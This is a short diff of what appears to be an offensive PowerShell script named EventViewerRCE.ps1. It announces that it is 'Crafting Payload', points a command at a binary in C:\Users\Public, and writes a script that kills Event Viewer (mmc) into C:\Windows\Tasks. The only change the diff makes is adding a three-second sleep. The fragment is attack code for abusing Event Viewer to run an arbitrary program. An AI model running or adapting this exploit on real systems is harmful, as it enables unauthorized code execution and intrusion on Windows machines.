@@ -1,5 +1,6 @@
 echo "[+] Running"
 echo "[1] Crafting Payload"
+Start-Sleep 3
 $command = "C:\Users\Public\explorer.exe"
 # Closes Event Viewer and then runs user commmand.
 echo 'Stop-Process -name mmc*' > C:\Windows\Tasks\EventViewerRCE.ps1 
